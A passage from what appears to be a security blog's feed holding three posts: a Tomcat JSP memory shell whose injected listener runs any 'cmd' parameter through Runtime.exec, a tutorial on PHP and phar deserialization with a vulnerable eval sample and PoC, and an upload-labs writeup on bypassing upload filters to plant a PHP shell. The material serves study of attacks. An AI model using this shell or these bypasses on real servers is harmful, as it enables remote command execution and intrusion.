class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Arrays&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: leihehe</span><br><span class="line">  Date: <span class="number">29</span>/<span class="number">12</span>/<span class="number">2021</span></span><br><span class="line">  Time: <span class="number">15</span>:<span class="number">52</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> servletRequestEvent.getServletRequest();</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) servletRequest;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> requestFacade.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestField.get(requestFacade);</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">while</span> ((i=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    request.getResponse().getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));</span><br><span class="line">                    request.getResponse().getWriter().write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    Field stdFiled=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">aplContext</span> <span class="operator">=</span> (ApplicationContext) stdFiled.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardFld</span> <span class="operator">=</span> aplContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardFld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardFld.get(aplContext);</span><br><span class="line"></span><br><span class="line">    List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());</span><br><span class="line">    List&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(applicationEventListeners);</span><br><span class="line">    arrayList.add(<span class="number">0</span>,<span class="keyword">new</span> <span class="title class_">EvilListener</span>());</span><br><span class="line">    standardContext.setApplicationEventListeners(arrayList.toArray());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://blog.csdn.net/qq_31772441/article/details/80095037">调用list.add方法报错（java.lang.UnsupportedOperationException）</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Memory Shell</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Memory Shell</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>php与phar反序列化漏洞小结</title>
    <url>/2021/07/08/php%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<h1 id="PHP反序列化漏洞（unseriliaze）"><a href="#PHP反序列化漏洞（unseriliaze）" class="headerlink" title="PHP反序列化漏洞（unseriliaze）"></a>PHP反序列化漏洞（unseriliaze）</h1><h2 id="什么是PHP反序列化漏洞"><a href="#什么是PHP反序列化漏洞" class="headerlink" title="什么是PHP反序列化漏洞"></a>什么是PHP反序列化漏洞</h2><blockquote>
<p><strong>php序列化</strong>的函数为 serialize ，可以将对象中的成员变量转换成字符串。 <strong>反序列化</strong>的函数为 unserilize ，可以将 serialize 生成的字符串重新还原为对象中的成员变量。 将用户可控的数据进行了<strong>反序列化</strong>，就是<strong>PHP反序列化漏洞</strong></p>
</blockquote>
<p>简单来说，就是我们可以控制<code>unserialize(a)</code>这个函数接收的参数<code>a</code>，比如通过<code>GET</code>或POST接收参数<code>a</code>，我们可以通过伪造自己的序列化后的恶意代码（通过修改程序原有的魔术方法属性），然后让unserialize()这个函数去反序列化我们构造的恶意代码，从而达到执行的效果。</p>
<span id="more"></span>

<h2 id="基础知识：序列化的属性权限问题"><a href="#基础知识：序列化的属性权限问题" class="headerlink" title="基础知识：序列化的属性权限问题"></a>基础知识：序列化的属性权限问题</h2><p>php在使用serialize()的时候产生的数据会根据attribute的权限不同，产生不同的数据和长度。</p>
<h3 id="private类型"><a href="#private类型" class="headerlink" title="private类型"></a>private类型</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="string">&#x27;bad&#x27;</span>;<span class="comment">//此处我们将flag设为private类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span>(<span class="params"><span class="variable">$flag</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;flag=<span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$object</span>-&gt;<span class="title function_ invoke__">set_flag</span>(<span class="string">&#x27;good&#x27;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$object</span>);<span class="comment">//序列化这个object</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;<span class="comment">//把结果打出来</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>观察发现打出来的结果是：<code>O:4:&quot;test&quot;:1:&#123;s:10:&quot;testflag&quot;;s:6:&quot;Active&quot;;&#125;</code></p>
<p>此处代表属性名的testflag长度实际只有8，为什么却打出来有10个呢。这是因为他生成的格式是==%00类名%00属性名==</p>
<h3 id="protected类型"><a href="#protected类型" class="headerlink" title="protected类型"></a>protected类型</h3><p>生成格式为==%00*%00属性名==</p>
<h3 id="public类型"><a href="#public类型" class="headerlink" title="public类型"></a>public类型</h3><p>生成格式直接为==属性名==</p>
<h2 id="基础知识：魔法方法"><a href="#基础知识：魔法方法" class="headerlink" title="基础知识：魔法方法"></a>基础知识：魔法方法</h2><h3 id="construct"><a href="#construct" class="headerlink" title="construct()"></a><strong>construct()</strong></h3><p>对象创建时调用，但**unserialize()**不会调用</p>
<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="wakeup()"></a><strong>wakeup()</strong></h3><p>在unserialize()的时候会自动调用</p>
<h3 id="destruct"><a href="#destruct" class="headerlink" title="destruct()"></a><strong>destruct()</strong></h3><p>当对象被销毁的时候会被调用</p>
<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a><strong>toString()</strong></h3><p>当<strong>反序列化</strong>后的对象被输出在模版的时候会被调用</p>
<blockquote>
<p>(1)echo (<code>$obj</code>) / print(<code>$obj</code>) 打印时会触发</p>
<p>(2)反序列化对象与字符串连接时</p>
<p>(3)反序列化对象参与格式化字符串时</p>
<p>(4)反序列化对象与字符串进行 == 比较时（PHP进行 == 比较的时候会转换参数类型）</p>
<p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p>
<p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p>
<p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong>toString会被调用</p>
<p>(8)反序列化的对象作为 class_exists() 的参数的时候</p>
</blockquote>
<h3 id="get"><a href="#get" class="headerlink" title="get()"></a><strong>get()</strong></h3><p>当从不可访问的属性读取数据时调用</p>
<h3 id="call"><a href="#call" class="headerlink" title="call()"></a><strong>call()</strong></h3><p>当在对象上下文中调用不可访问的方法时触发</p>
<h2 id="基础知识：PHP反序列化利用条件"><a href="#基础知识：PHP反序列化利用条件" class="headerlink" title="基础知识：PHP反序列化利用条件"></a>基础知识：PHP反序列化利用条件</h2><ul>
<li>当前作用域必须要有该Class存在</li>
<li>序列化之序列化属性，不序列化Method，所以我们只能控制Attribute</li>
<li>在写payload的时候，我们只写与属性有关的内容，若涉及到方法，该方法也需要在原始的漏洞代码中存在。</li>
</ul>
<h1 id="PHP反序列化进阶：Phar反序列化漏洞"><a href="#PHP反序列化进阶：Phar反序列化漏洞" class="headerlink" title="PHP反序列化进阶：Phar反序列化漏洞"></a>PHP反序列化进阶：Phar反序列化漏洞</h1><h2 id="什么是Phar"><a href="#什么是Phar" class="headerlink" title="什么是Phar"></a>什么是Phar</h2><p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。<a href="https://zh.wikipedia.org/wiki/PHAR_(%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F)#cite_note-file-ext-1">[来源于wiki]</a></p>
<h2 id="phar组成结构"><a href="#phar组成结构" class="headerlink" title="phar组成结构"></a>phar组成结构</h2><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p>phar文件的标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；</code></p>
<p>xxx可以为任何内容，所以我们可以伪造图片来绕过上传限制</p>
<h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>以序列化形式储存，含压缩文件属性等信息</p>
<p>当文件操作函数通过<strong>phar://伪协议</strong>来解析phar文件的时候就会将数据反序列化，所以我们可以利用<strong>系统文件操作函数</strong>来反序列化。</p>
<h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p>压缩文件的内容</p>
<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>签名，在文件的末尾</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li><p>文件上传点 - phar文件能够上传到服务端</p>
</li>
<li><p>有系统文件操作函数，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符未被过滤。</p>
<ul>
<li><p><img src="/image/php%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210708105320550.png" alt="image-20210708105320550"></p>
</li>
<li><p>只要是函数的实现过程间接或直接调用了php_stream_open_wrapper都可能触发phar反序列化漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exif_thumbnail</span><br><span class="line">exif_imagetype</span><br><span class="line">imageloadfont</span><br><span class="line">imagecreatefrom***</span><br><span class="line">hash_hmac_file</span><br><span class="line">hash_file</span><br><span class="line">hash_update_file</span><br><span class="line">md5_file</span><br><span class="line">sha1_file</span><br><span class="line">get_meta_tags</span><br><span class="line">get_headers</span><br><span class="line">getimagesize</span><br><span class="line">getimagesizefromstring</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;c.zip&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="string">&#x27;phar://test.phar/test&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>除了以上还有很多函数可能触发，更多的参见<a href="https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">另一位师父的关于phar反序列化的文章</a></p>
</li>
</ul>
</li>
<li><p>有可用的魔术方法作为跳板</p>
</li>
<li><p>phar:// 伪协议</p>
</li>
</ul>
<h2 id="如何生成一个phar文件？"><a href="#如何生成一个phar文件？" class="headerlink" title="如何生成一个phar文件？"></a>如何生成一个phar文件？</h2><p>windows首先将php.ini里面的<code>phar.readonly</code>设为off，并把最前面的注释符去掉</p>
<p>在网上看见有师父提到linux环境下：</p>
<p><code>如果是linux环境下，需要在 /etc/php/7.0/apache2/php.ini 和/etc/php/7.0/cli/php.ini 这两个文件都需要修改 phar.readonly 否则不能生成phar文件</code></p>
<p>我本人用的是mac系统,在etc/private/php.ini直接修改即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> =<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);<span class="comment">//生成的文件后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php xxx; __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//将自定义的object传入meta-data里</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;phartest.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p><strong>踩了一个坑：</strong></p>
<p>代码写好后，有一个坑，就是我直接运行浏览器运行php是不行的（提示500错误），研究以后猜测是权限问题，因为我的网站是搭建在library目录下的，后来改用命令行在<code>vscode</code>里运行提示也<code>permission denied</code>,加上<code>sudo</code>就好了。</p>
<h2 id="phar反序列化漏洞利用实例"><a href="#phar反序列化漏洞利用实例" class="headerlink" title="phar反序列化漏洞利用实例"></a>phar反序列化漏洞利用实例</h2><p><strong>漏洞代码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;<span class="comment">//检测是否有名为filename的get请求</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];<span class="comment">//获取该请求并赋值给filename</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;<span class="comment">//可以利用的class</span></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;echo &quot;hahaha&quot;;&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)//可以利用的魔术方法</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;output);<span class="comment">//这里eval会执行output的内容</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>);<span class="comment">//可以利用的文件操作函数</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>POC:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;<span class="comment">//要利用的class</span></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;phpinfo();&#x27;</span>; <span class="comment">//我们只需要覆写output这个attribute的值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//删除已存在的test.phar</span></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>实现：在get请求中采用phar://你的文件.phar的格式，成功执行代码</strong></p>
<p><img src="/image/php%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210708162848044.png" alt="image-20210708162848044"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>感谢<a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">K0rz3n大牛的php反序列化文章</a></p>
<p>感谢<a href="https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Threezh1大牛的phar反序列化文章</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>PHP Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs Writeups</title>
    <url>/2021/07/14/upload-labs-%E9%80%9A%E5%85%B3WP/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在练习文件上传漏洞，正好拿<a href="https://github.com/c0ny1/upload-labs">upload-labs</a>靶场练手。这里是在windows系统环境下进行的，建议直接使用作者提供的<a href="https://github.com/c0ny1/upload-labs/releases">windows集成环境</a>（之前我自己搭建的环境因为中间件和PHP配置不同，有些上传漏洞无法复原）。</p>
<h1 id="Pass-01-前端JS后缀名检测绕过"><a href="#Pass-01-前端JS后缀名检测绕过" class="headerlink" title="Pass-01 - 前端JS后缀名检测绕过"></a>Pass-01 - 前端JS后缀名检测绕过</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先常规思路，选择一个shell文件上传，同时用<code>Burp Suit</code>抓包</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210714224722994.png" alt="image-20210714224722994"></p>
<p>提示文件不允许上传，同时观察<code>Burp Suite</code>中并未抓到数据，说明此处是通过前端<code>js</code>文件来检查文件类型的。在<code>chrome</code>上用<code>Network</code>功能抓包，发现并未有任何<code>js</code>文件加载，于是猜测<strong>检测代码</strong>是直接写在当前页面的。</p>
<span id="more"></span>

<p>于是直接右键查看网站源代码，在源码底部可以看见我们需要的<code>javascript</code>代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            <span class="title function_">alert</span>(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>我们把shell文件后缀修改为jpg,然后再上传抓包,在<code>filename</code>处将文件名后缀改回php。</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210714233757638.png" alt="image-20210714233757638"></p>
<p>上传成功，复制图像链接即可获得shell文件地址。</p>
<h2 id="方法总结"><a href="#方法总结" class="headerlink" title="方法总结"></a>方法总结</h2><p>主要是绕过前端javascript的文件名检测，可以先改成图片的格式，绕过js后通过抓包再修改回来。</p>
<h1 id="Pass-02-Content-Type绕过"><a href="#Pass-02-Content-Type绕过" class="headerlink" title="Pass-02 - Content-Type绕过"></a>Pass-02 - Content-Type绕过</h1><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>直接上传php文件，出现<img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210715012843947.png" alt="image-20210715012843947"></p>
<p><code>Burpsuite</code>抓包发现被拦截，所以我们推测是后端代码检测文件类型。</p>
<p><code>Burpsuite</code>抓包后直接修改<code>Content-Type</code>为<code>image/gif</code></p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210715013059979.png" alt="image-20210715013059979"></p>
<p>文件上传成功，成功绕过。</p>
<h2 id="方法总结-1"><a href="#方法总结-1" class="headerlink" title="方法总结"></a>方法总结</h2><p>根据其源码更好理解：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可知其仅判断文件类型：<code>$_FILES[&#39;upload_file&#39;][&#39;type&#39;]</code>，使用<code>Burp Suite</code>修改<code>Content-Type</code>即可。</p>
<h1 id="Pass-03-PHP文件的其他格式绕过"><a href="#Pass-03-PHP文件的其他格式绕过" class="headerlink" title="Pass-03 - PHP文件的其他格式绕过"></a>Pass-03 - PHP文件的其他格式绕过</h1><h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>先直接上传一个<code>shell.php</code>, 发现提示<img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210717095818207.png" alt="image-20210717095818207">，抓包也抓到了，说明此处是后端检测后缀名，但它并未检测<code>.phtml</code>, <code>.php3</code>和<code>.php5</code>这样的后缀，所以我们直接上传该格式即可。</p>
<p>如果不解析上述后缀，我们可以在<code>httpd.conf</code>添加 <code>AddType application/x-httpd-php .php .phtml .php3 .php5</code></p>
<h2 id="方法总结-2"><a href="#方法总结-2" class="headerlink" title="方法总结"></a>方法总结</h2><p>看代码：</p>
